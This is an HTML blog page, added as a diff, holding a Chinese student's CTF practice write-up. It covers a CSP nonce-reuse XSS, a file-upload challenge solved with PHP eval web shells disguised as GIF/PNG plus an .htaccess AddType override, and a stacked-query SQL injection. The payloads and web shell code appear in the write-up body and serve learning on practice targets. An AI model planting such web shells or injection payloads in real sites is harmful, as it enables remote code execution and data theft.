@@ -1,0 +1,785 @@
+<!doctype html>
+<html class="position-relative" itemscope itemtype="https://schema.org/WebPage" lang="en"
+  data-bs-theme="auto" data-palette="blue">
+  <head><script src="/assets/init/bundle.min.acf86bec8f1585feebb4a7bc424e2c509abd0c84c974075fb9eee923b2c62b39.js" integrity="sha256-rPhr7I8Vhf7rtKe8Qk4sUJq9DITJdAdfue7pI7LGKzk=" crossorigin="anonymous"></script>
+<meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>251129每日打卡 - xiaochai_123的小窝</title>
+    <link rel="icon" href="https://xiaochai-123.github.io/images/icons/icon-16x16.png?version=10de02cdc53ad46a103b64b869070266" sizes="16x16">
+    <link rel="icon" href="https://xiaochai-123.github.io/images/icons/icon-32x32.png?version=f1747f8c31b6821777c3a0956b5ba0db" sizes="32x32">
+    <link rel="icon" href="/favicon_hu_1fce3f16494f6ae3.png" sizes="150x150" type="image/png">
+    <link rel="apple-touch-icon" href="/favicon_hu_f105fae78c239d0f.png" sizes="180x180" type="image/png">
+    <link rel="icon" href="/favicon_hu_af357fe99fc0195a.png" sizes="192x192" type="image/png">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#6f42c1"><link rel="icon" href="https://xiaochai-123.github.io/images/icons/favicon.ico?version=13a0b7f517ed6605fd5fc54b37b8552d">
+<meta name="keywords" content="" />
+  <meta name="description" content="2025/11/29做题记录" />
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="251129每日打卡">
+  <meta name="twitter:description" content="2025/11/29做题记录">
+<meta property="og:url" content="https://xiaochai-123.github.io/posts/251129/">
+  <meta property="og:site_name" content="xiaochai_123的小窝">
+  <meta property="og:title" content="251129每日打卡">
+  <meta property="og:description" content="2025/11/29做题记录">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-11-29T20:43:35+08:00">
+    <meta property="article:modified_time" content="2025-11-29T20:43:35+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Web">
+
+  <meta itemprop="name" content="251129每日打卡">
+  <meta itemprop="description" content="2025/11/29做题记录">
+  <meta itemprop="datePublished" content="2025-11-29T20:43:35+08:00">
+  <meta itemprop="dateModified" content="2025-11-29T20:43:35+08:00">
+  <meta itemprop="wordCount" content="308">
+  <meta itemprop="keywords" content="CTF,Web">
+  <meta property="og:image" content="https://xiaochai-123.github.io/images/logo.png"/>
+  <meta name="twitter:image" content="https://xiaochai-123.github.io/images/logo.png"/>
+  <meta property="og:image:alt" content="251129每日打卡" />
+  <meta name="twitter:image:alt" content="251129每日打卡" />
+
+<link data-precache rel="stylesheet" href="/assets/main/bundle.min.5e43b1a2119e65d96e086e7147d978bfdbb1033637f8262ecddbd3fbaee298c1.css" integrity="sha256-XkOxohGeZdluCG5xR9l4v9uxAzY3+CYuzdvT+67imME=" crossorigin="anonymous">
+
+    <link data-precache rel="stylesheet" href="/assets/viewer/bundle.min.16d2c85c4cae39a98f8cb7a977e95e554b174f91a5484c32605637156f49ca6b.css" integrity="sha256-FtLIXEyuOamPjLepd&#43;leVUsXT5GlSEwyYFY3FW9Jyms=" crossorigin="anonymous">
+
+
+
+<link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/all.min.css">
+  </head>
+  <body><header class="mb-4 sticky-top">
+  
+<nav class="top-app-bar shadow navbar navbar-expand-lg">
+  <div class="container">
+<a class="navbar-brand d-flex align-items-center flex-grow-1 flex-xxl-grow-0 justify-content-xxl-start ms-2 ms-xxl-0 mx-auto me-xxl-2"
+    href="https://xiaochai-123.github.io/">
+    <picture><img class="logo " alt="Logo" src="https://xiaochai-123.github.io/images/logo.png?v=166cbf8ee66ab6626f3f85db1fb49313" loading="lazy" width="2048" height="2048" />
+</picture>
+xiaochai_123的小窝
+</a>
+
+    <div class="offcanvas-lg offcanvas-end flex-grow-1" data-bs-scroll="true" tabindex="-1" id="navbarMenus" aria-labelledby="navbarMenusLabel">
+      <div class="offcanvas-header px-4 pb-0">
+        <div class="offcanvas-title h5" id="navbarMenusLabel">xiaochai_123的小窝</div>
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="offcanvas" data-bs-target="#navbarMenus" aria-label="Close"></button>
+      </div>
+      <div class="offcanvas-body p-4 pt-0 p-lg-0">
+        <hr class="d-lg-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center me-auto"><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://xiaochai-123.github.io/posts/">Posts
+            </a>
+          </li><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://xiaochai-123.github.io/categories/">Categories
+            </a>
+          </li><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://xiaochai-123.github.io/tags/">Tags
+            </a>
+          </li><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://xiaochai-123.github.io/friends/">Friends
+            </a>
+          </li>
+        </ul>
+        
+    <hr class="d-lg-none">
+    <form class="search-bar ms-auto my-auto" action="" novalidate>
+      <div class="input-group align-items-center">
+        <span class="btn btn-search disabled position-absolute left-0 border-0 px-1">
+          <i class="fas fa-fw fa-search fa-lg"></i>
+        </span>
+        <input
+          class="my-1 form-control border-white rounded-5 search-input bg-body"
+          name="q"
+          type="search"
+          placeholder="Search"
+          aria-label="Search"
+          required>
+          <span class="search-shortcut position-absolute end-0 top-0 me-2">
+            <kbd class="text-dark bg-white opacity-75 rounded-3 shadow border border-primary py-1 fw-bold">/</kbd>
+          </span>
+      </div>
+    </form><hr class="d-lg-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center ms-md-auto">
+<li class="nav-item dropdown col-6 col-lg-auto">
+    <a class="nav-link px-0 py-2 px-lg-1" href="#" id="paletteDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="fas fa-fw fa-palette"></i>
+        <span class="d-lg-none">Palette</span>
+    </a>
+    <ul class="palette-dropdown-menu dropdown-menu dropdown-menu-end px-2 row g-2" aria-labelledby="paletteDropdown">
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue" aria-label="Blue"
+                    class="btn btn-sm w-100 palette text-bg-blue" data-palette="blue">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue-gray" aria-label="Blue Gray"
+                    class="btn btn-sm w-100 palette text-bg-blue-gray" data-palette="blue-gray">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-brown" aria-label="Brown"
+                    class="btn btn-sm w-100 palette text-bg-brown" data-palette="brown">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-cyan" aria-label="Cyan"
+                    class="btn btn-sm w-100 palette text-bg-cyan" data-palette="cyan">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-green" aria-label="Green"
+                    class="btn btn-sm w-100 palette text-bg-green" data-palette="green">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-indigo" aria-label="Indigo"
+                    class="btn btn-sm w-100 palette text-bg-indigo" data-palette="indigo">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-orange" aria-label="Orange"
+                    class="btn btn-sm w-100 palette text-bg-orange" data-palette="orange">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-pink" aria-label="Pink"
+                    class="btn btn-sm w-100 palette text-bg-pink" data-palette="pink">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-purple" aria-label="Purple"
+                    class="btn btn-sm w-100 palette text-bg-purple" data-palette="purple">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-red" aria-label="Red"
+                    class="btn btn-sm w-100 palette text-bg-red" data-palette="red">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-teal" aria-label="Teal"
+                    class="btn btn-sm w-100 palette text-bg-teal" data-palette="teal">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-yellow" aria-label="Yellow"
+                    class="btn btn-sm w-100 palette text-bg-yellow" data-palette="yellow">
+                </a>
+            </li>
+    </ul>
+</li>
+<li class="nav-item dropdown col-6 col-lg-auto">
+    <a class="nav-link px-0 py-2 px-lg-1" href="#" id="modeDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="mode-icon fas fa-fw fa-adjust" id="modeIcon"></i>
+        <span class="d-lg-none">Mode</span>
+    </a>
+    <ul class="mode-dropdown-menu dropdown-menu dropdown-menu-end" aria-labelledby="modeDropdown">
+        <li class="mode-item" data-color-mode="light" data-icon="sun">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-sun"></i> Light
+            </button>
+        </li>
+        <li class="mode-item" data-color-mode="dark" data-icon="moon">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-moon"></i> Dark
+            </button>
+        </li>
+        <li class="mode-item active" data-color-mode="auto" data-icon="adjust">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-adjust"></i> Auto
+            </button>
+        </li>
+    </ul>
+</li>
+        </ul>
+      </div>
+    </div>
+    <div class="d-flex">
+      <button class="navbar-toggler order-5 border-0" type="button" data-bs-toggle="offcanvas" data-bs-target="#navbarMenus"
+        aria-controls="navbarMenus" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-ellipsis-h"></i>
+      </button>
+    </div>
+  </div>
+</nav>
+
+</header>
+
+    <main class="container has-sidebar" data-kind="page"><script data-precache src="/js/main-init.6a1fd2a99f6ad87b4aa9b7ed0f10344d4273d92cc29a6fb2cf05c463ec57ce39.js" integrity="sha256-ah/SqZ9q2HtKqbftDxA0TUJz2SzCmm&#43;yzwXEY&#43;xXzjk=" crossorigin="anonymous"></script>
+
+      <div class="row content"><noscript>
+    <div class="alert alert-danger" role="alert">Your browser does not support JavaScript.</div>
+</noscript>
+
+<div class="content-posts col-xxl-8">
+  <div class="container"><nav class="row card component" aria-label="breadcrumb">
+  <div class="card-body pb-0">
+    <ol class="hbs-breadcrumb breadcrumb flex-nowrap"><li class="breadcrumb-item text-surface"><a href="/">Home</a></li><li class="breadcrumb-item text-surface"><a href="/posts/">Posts</a></li><li class="breadcrumb-item active">251129每日打卡</li></ol>
+  </div>
+</nav><div class="post-panel-wrapper position-relative d-flex justify-content-center">
+  <div class="d-flex flex-row justify-content-center rounded-5 border post-panel position-fixed px-3 py-1 surface shadow-1">
+    
+    
+
+    
+    
+    
+  <a class="action action-toc d-none d-xxl-block" href="#postTOC" role="button" title="Contents">
+    <i class="fas fa-fw fa-list-alt"></i>
+  </a>
+<a class="action action-toc d-block d-xxl-none" href="#post-toc-container" role="button" title="Contents">
+  <i class="fas fa-fw fa-list-alt"></i>
+</a>
+
+    <a class="action action-post-comments" href="#post-comments" role="button" aria-label="Comments" title="Comments">
+  <i class="fas fa-fw fa-comments"></i>
+</a>
+    
+<a id="sidebarToggler" class="action action-sidebar-toggler d-none d-xl-block" role="button" title="Toggle sidebar">
+  <i class="fas fa-fw fa-expand-alt" data-fa-transform="rotate-45"></i>
+</a>
+
+    
+  </div>
+</div><article class="row card component mb-4 post">
+  <div class="card-header ">
+    <h1 class="card-title post-title my-2">251129每日打卡</h1>
+  </div>
+  <div class="card-body"><div class="post-meta mb-3">
+  <span class="post-date me-1 mb-1" title="created on 2025-11-29 20:43:35 &#43;0800 CST.">November 29, 2025</span><span class="post-reading-time me-1 mb-1">2 min read</span><a href="/categories/ctf%E6%AF%8F%E6%97%A5%E6%89%93%E5%8D%A1/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
+      <i class="fas fa-fw fa-folder me-1"></i>CTF每日打卡</a><a href="/tags/ctf/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">CTF</a><a href="/tags/web/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">Web</a>
+</div>
+
+      <p class="lead mb-3 text-body-emphasis">2025/11/29做题记录</p>
+<div class="mt-2 mb-3 d-block d-xxl-none">
+    <h2 class="text-surface mb-3">Contents</h2>
+    <div id="post-toc-container">
+        </div>
+    <hr class="text-secondary">
+</div><div class="post-content mb-3" data-bs-spy="scroll" data-bs-target="#TableOfContents" tabindex="0">
+        <div id="post-content-body"><p>2025/11/29 我决定每天打卡几道题来积少成多</p>
+
+<h2 id="afctf-2021baby_csp" data-numberify>[AFCTF 2021]BABY_CSP<a class="anchor ms-1" href="#afctf-2021baby_csp"></a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;X-UA-Compatible&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IE=edge&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;BABY CSP&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;#&#39;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn&#34;</span>&gt;whe3e are y0u fr0m?&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">nonce</span><span style="color:#f92672">=</span><span style="color:#e6db74">29de6fde0db5686d</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">btn</span>.<span style="color:#a6e22e">onclick</span> <span style="color:#f92672">=</span> () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./?school=&#39;</span> <span style="color:#f92672">+</span> encodeURIComponent([<span style="color:#e6db74">&#39;CSU&#39;</span>, <span style="color:#e6db74">&#39;JXNU&#39;</span>, <span style="color:#e6db74">&#39;HEBNU&#39;</span>, <span style="color:#e6db74">&#39;I don\&#39;t konw :( &#39;</span>][Math.<span style="color:#a6e22e">floor</span>(<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> Math.<span style="color:#a6e22e">random</span>())]);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;&lt;<span style="color:#f92672">p</span>&gt;I don&#39;t konw :( !&lt;/<span style="color:#f92672">p</span>&gt;&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>这是题目的源码。页面内容为<code>wewhe3e are y0u fr0m?</code>按钮，按后会出现CSU，JXNU，HEBNU，idk之一</p>
+<p>通过题目我们可以看到考察CSP，而题目通过GET方法获得school参数从而回显到屏幕上</p>
+<p>注意到源码内包含了nonce(一次性令牌)，说明脚本必须带这个令牌，否则CSP会阻止脚本执行。</p>
+<p>那我们先来了解一下nonce</p>
+<blockquote>
+<p>Nonce（Number Used Once）是一个在密码学、区块链和计算机安全中常用的术语，指一个<strong>仅使用一次的随机或伪随机数</strong>。 它的核心目的是确保每次操作或通信的唯一性，防止重放攻击（Replay Attack）或其他安全威胁。 在加密算法（如AES、SSL/TLS）或认证协议中，nonce作为临时令牌，确保每次加密的输入唯一，即使明文相同，生成的密文也不同。</p>
+</blockquote>
+<p>先来尝试下URL传入<code>/?school=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p>题目只回显了一个感叹号，因为script标签没有正确的nonce所以被拦截了。</p>
+<p>那我们传入事件型标签XSS<code>/?school=&quot;&gt;&lt;img src=x onerror=alert(1)&gt;</code></p>
+<p>回显中为    <code>&lt;/script&gt;&lt;p&gt;&quot;&gt;&lt;img src=[x](http://node4.anna.nssctf.cn:28499/x) onerror=alert(1)&gt;!&lt;/p&gt;&lt;/html&gt;</code></p>
+<p>并没有弹窗 说明我们的<img>、<svg>事件属性都不能执行</p>
+<p>那就想能不能伪造nonce？看了半天发现人家这个nonce压根是没变的。。。。</p>
+<p>所以构建payload</p>
+<p><code>&lt;script nonce=&quot;29de6fde0db5686d&quot;&gt;alert(flag);&lt;/script&gt;</code></p>
+<p>出现flag</p>
+<p><picture><img class="img-fluid " alt="msedge_PwJE7DbiFH" src="https://xiaochai-123.github.io/images/screenshoots/2025-11/msedge_PwJE7DbiFH.png?v=90b04b9fb443a0d67058f71c2a003c7c" loading="lazy" width="1376" height="651" />
+</picture>
+
+</p>
+
+<h2 id="gxyctf-2019babyupload" data-numberify>[GXYCTF 2019]BabyUpload<a class="anchor ms-1" href="#gxyctf-2019babyupload"></a></h2>
+<p>题目给了个上传界面，这种题的逻辑就是上传个木马上去然后来控制</p>
+<p>写个一句话小马，命名为shell.php上传</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">eval</span>($_POST[<span style="color:#e6db74">&#39;cmd&#39;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>报告<code>后缀名不能有ph！</code>，那我们来试试什么格式才能上传</p>
+<p>修改为jpeg之后发现可以报告的内容不一样了<code>诶，别蒙我啊，这标志明显还是php啊</code></p>
+<p>那我们换一个payload试试</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($_POST[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
+</span></span></code></pre></div><p>发现可以上传<code>/var/www/html/upload/13de67143aa52630e21851a1180b233b/sh.jpeg succesfully uploaded!</code></p>
+<p>尝试一下能否直接连到我们的小马，连接不上</p>
+<p>那就得伪造了，并且得让我们的木马被当作php文件来解析，就需要尝试来上传覆盖掉<code>.htaccess</code>文件（Apache目录配置文件）</p>
+<p>直接传还传不上去，利用MIME伪造文件类型</p>
+<p><picture><img class="img-fluid " alt="java_rdGa86ouGd.png" src="https://xiaochai-123.github.io/images/screenshoots/2025-11/java_rdGa86ouGd.png?v=9359b4b82a774abe7a2b0f63cf328858" loading="lazy" width="1552" height="1192" />
+</picture>
+
+</p>
+<p>然后连接后发现，文件被当作文本放出来了。</p>
+<p>参考下别的wp，改用png伪造木马</p>
+<p>修改配置文件为<code>AddType application/x-httpd-php .png</code></p>
+<p>构建payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">GIF89a</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;php&#39;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($_POST[<span style="color:#e6db74">&#34;a&#34;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">show_source</span>(<span style="color:#e6db74">&#34;/flag&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>然后直接访问其上传地址即可看到flag</p>
+
+<h2 id="suctf-2019easysql" data-numberify>[SUCTF 2019]EasySQL<a class="anchor ms-1" href="#suctf-2019easysql"></a></h2>
+<p>哇，参考了很多人的wp，<strong>远看成岭侧成峰，flag高低各不同</strong></p>
+<p>输入sleep，or，union等常见的sql语句，发现都被过滤掉了，回显Nonono.</p>
+<p>输入数字回显Array ( [0] =&gt; 1 )，字母无回显</p>
+<p>可以用<code>1;show databases;</code>来看到数据库</p>
+<pre tabindex="0"><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; ctf ) Array ( [0] =&gt; ctftraining ) Array ( [0] =&gt; information_schema ) Array ( [0] =&gt; mysql ) Array ( [0] =&gt; performance_schema ) Array ( [0] =&gt; test )
+</code></pre><p><code>1;show tables;</code>可以看到表名</p>
+<pre tabindex="0"><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )
+</code></pre><p>构建payload<code>*,1</code>，得到回显<code>Array ( [0] =&gt; flag{fafb0156-ad41-47ab-96e1-5db21ec84a6b} [1] =&gt; 1 )</code></p>
+<p>这个payload后端实际变成<code>SELECT *,1 FROM Flag</code></p>
+<p>但是只用*就没有回显。那只能猜测这是后端的小判断，这里参考下AI的答案</p>
+<blockquote>
+
+<h2 id="你的现象" data-numberify>你的现象<a class="anchor ms-1" href="#你的现象"></a></h2>
+<ul>
+<li><strong>输入 <code>1</code></strong> 页面会回显</li>
+<li><strong>输入 <code>\*</code></strong> 页面没有回显</li>
+<li><strong>输入 <code>\*,1</code></strong> 页面回显 flag 和 1</li>
+</ul>
+<hr>
+
+<h2 id="为什么" data-numberify>为什么？<a class="anchor ms-1" href="#为什么"></a></h2>
+
+<h3 id="1-输入-1" data-numberify>1. 输入 1<a class="anchor ms-1" href="#1-输入-1"></a></h3>
+<p>你的输入变成 SQL：</p>
+<p>SQL</p>
+<pre tabindex="0"><code>SELECT 1 FROM Flag
+</code></pre><ul>
+<li>查询的是常量 <code>1</code>，对每一行都返回一个 <code>1</code></li>
+<li>Flag表如果有很多行，PHP会把每行的<code>1</code>输出出来</li>
+<li>回显的是常量，不是 flag，但确实有结果返回</li>
+<li><strong>这说明只要结果集有内容，后端就会做回显</strong></li>
+</ul>
+
+<h3 id="2-输入-" data-numberify>2. 输入 *<a class="anchor ms-1" href="#2-输入-"></a></h3>
+<p>SQL:</p>
+<p>SQL</p>
+<pre tabindex="0"><code>SELECT * FROM Flag
+</code></pre><ul>
+<li>查询所有字段（如果Flag表只有一行，只有flag字段）</li>
+<li>理论上应该回显 flag</li>
+<li>但<strong>实际上页面没有回显</strong>，可能PHP处理<code>fetch_array</code>结果时只输出数字下标、或者因为没有多个字段不执行输出逻辑</li>
+</ul>
+
+<h3 id="3-输入-1" data-numberify>3. 输入 *,1<a class="anchor ms-1" href="#3-输入-1"></a></h3>
+<p>SQL:</p>
+<p>SQL</p>
+<pre tabindex="0"><code>SELECT *,1 FROM Flag
+</code></pre><ul>
+<li>
+<p>查询所有字段（flag），再加一个字段常量1</p>
+</li>
+<li>
+<p>得到的数据是：</p>
+<p>Code</p>
+<pre tabindex="0"><code>Array( [0] =&gt; flag内容 [1]=&gt;1)
+</code></pre></li>
+<li>
+<p>回显 flag内容和1，因为结果有多列</p>
+</li>
+</ul>
+<hr>
+
+<h2 id="可能的php后端逻辑" data-numberify>可能的PHP后端逻辑<a class="anchor ms-1" href="#可能的php后端逻辑"></a></h2>
+
+<h3 id="方案一数组长度判断" data-numberify>方案一：数组长度判断<a class="anchor ms-1" href="#方案一数组长度判断"></a></h3>
+<p>PHP</p>
+<pre tabindex="0"><code>$row = mysqli_fetch_array($result);
+if(count($row) &gt; 1){
+   foreach($row as $val) echo $val;
+}
+</code></pre><ul>
+<li>所以只有&gt;1的列才输出（<code>*,1</code>时有2列）</li>
+</ul>
+
+<h3 id="方案二只输出数字型下标" data-numberify>方案二：只输出数字型下标<a class="anchor ms-1" href="#方案二只输出数字型下标"></a></h3>
+<p>PHP</p>
+<pre tabindex="0"><code>$row = mysqli_fetch_array($result);
+for($i=0;$i&lt;count($row);$i++) echo $row[$i];
+</code></pre><ul>
+<li>单独<code>*</code>时行可能用的是字符串下标，PHP没输出</li>
+<li><code>*,1</code>时数字下标都有值</li>
+</ul>
+
+<h3 id="方案三某种特殊模板导致只有常量列默认输出" data-numberify>方案三：某种特殊模板导致只有常量列默认输出<a class="anchor ms-1" href="#方案三某种特殊模板导致只有常量列默认输出"></a></h3>
+<hr>
+
+<h2 id="为什么输入1会有回显" data-numberify>为什么输入1会有回显<a class="anchor ms-1" href="#为什么输入1会有回显"></a></h2>
+<p>因为：</p>
+<ul>
+<li>查询返回的是常量字段</li>
+<li>PHP写法默认输出所有返回列</li>
+<li>不是输出flag，还是让你看到有数据</li>
+</ul>
+<hr>
+
+<h2 id="总结分析" data-numberify>总结分析<a class="anchor ms-1" href="#总结分析"></a></h2>
+<ul>
+<li>你能用 <code>1</code> 和 <code>*,1</code> 回显，说明<strong>数据有结果就回显，不管是不是字段还是常量</strong></li>
+<li><code>*</code>没回显可能是PHP读<code>flag</code>字段用的是字符串下标，需要数字下标才输出结果</li>
+<li>用<code>*,1</code>可以强制让PHP的结果集有数字下标，被脚本输出</li>
+</ul>
+<hr>
+
+<h3 id="一句话总结" data-numberify>一句话总结<a class="anchor ms-1" href="#一句话总结"></a></h3>
+<blockquote>
+<p>输入 <code>1</code> 会回显，是因为SQL的常量结果集让PHP代码捕获到内容；只有 <code>*,1</code> 能出 flag，是因为flag字段内容也用数字下标输出，单<code>*</code>没起作用是后端代码数据结构原因。</p>
+</blockquote>
+</blockquote>
+<p>下次再见！</p>
+</div>
+</div>
+</div><div class="card-footer">
+  <div class="post-navs d-flex justify-content-evenly"><div class="post-nav post-prev">
+      <i class="fas fa-fw fa-chevron-down post-prev-icon me-1" data-fa-transform="rotate-90"></i>
+      <a href="/posts/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/">搭建博客</a>
+    </div><div class="post-nav post-next">
+      <a href="/posts/251204/">251204每日打卡</a>
+      <i class="fas fa-fw fa-chevron-down post-next-icon ms-1" data-fa-transform="rotate-270"></i>
+    </div></div>
+</div></article>
+<div class="card component row post-comments" id="post-comments">
+  <div class="card-header">
+    <h2 class="card-title my-2 fs-4 text-surface">Comments</h2>
+  </div>
+  <div class="card-body">
+
+<div class="giscus"></div>
+
+
+
+</div>
+</div></div>
+</div>
+<aside class="col-xxl-4 sidebar d-flex">
+  <div class="container d-flex flex-column">
+    
+    
+<div class="card mb-3">
+  <div class="card-body text-center">
+    <img src="/images/my-avatar.jpg" alt="我的头像" class="rounded-circle mb-2" width="100" height="100">
+    <h5 class="card-title">xiaochai_123</h5>
+    <p class="card-text">CS学生 | CTF界的小学生 | BD7PUC</p>
+<nav class="d-flex justify-content-center gap-2 my-2">
+  <a class="btn btn-sm btn-outline-dark rounded-circle" href="https://github.com/xiaochai-123" title="GitHub" target="_blank">
+    <i class="fab fa-github"></i>
+  </a>
+  <a class="btn btn-sm btn-outline-primary rounded-circle" href="mailto:l2556843965@163.com" title="Email">
+    <i class="fas fa-envelope"></i>
+  </a>
+  <a class="btn btn-sm btn-outline-danger rounded-circle" href="https://space.bilibili.com/595746072" title="Bilibili" target="_blank">
+  <i class="fab fa-bilibili"></i> 
+</a>
+  
+</nav>
+  </div>
+</div>
+
+
+    <div class="accordion posts-toggle">
+      <div class="row card component accordion-item">
+        <div class="accordion-header card-header border-0">
+          <a
+            class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent"
+            role="button"
+            data-bs-toggle="collapse"
+            href="#posts-toggle"
+            aria-expanded="true"
+            aria-controls="posts-toggle">
+            Posts
+          </a>
+        </div>
+        <div
+          class="card-body collapse accordion-collapse accordion-body d-lg-block show"
+          id="posts-toggle">
+          <ul class="nav nav-pills nav-fill" role="tablist">
+              <li class="nav-item" role="presentation">
+                <button
+                  class="nav-link active"
+                  id="recent-posts-tab"
+                  data-bs-toggle="tab"
+                  data-bs-target="#recent-posts"
+                  type="button"
+                  role="tab"
+                  aria-controls="recent-posts"
+                  aria-selected="true">
+                  Recent Posts
+                </button>
+              </li>
+          </ul>
+
+          <div class="tab-content mt-3">
+              <div
+                class="tab-pane active"
+                id="recent-posts"
+                role="tabpanel"
